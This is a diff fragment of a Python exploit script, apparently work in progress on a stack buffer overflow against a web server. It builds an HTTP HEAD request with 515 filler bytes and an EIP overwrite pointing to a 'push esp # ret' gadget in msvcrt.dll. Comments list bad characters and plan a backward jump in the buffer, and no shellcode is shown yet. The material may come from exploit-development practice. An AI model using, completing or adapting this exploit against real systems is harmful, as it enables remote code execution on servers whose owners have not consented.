@@ -4,7 +4,15 @@ import socket
 import os
 import sys
 
-Stage1 =  "hola"
+# ------------------------------------------------
+# badchars: \x00\x0d\x0a\x3d\x20\x3f
+# Stage1:
+# (1) EIP: 0x77C35459 push esp # ret | msvcrt.dll
+# (2) ESP: jump back 60 bytes in the buffer => ???
+# ------------------------------------------------
+
+eip = "\x59\x54\xc3\x77"
+Stage1 = "A"*515 + eip + "B"*2
 
 buffer = (
 "HEAD /" + Stage1 + " HTTP/1.1\r\n"
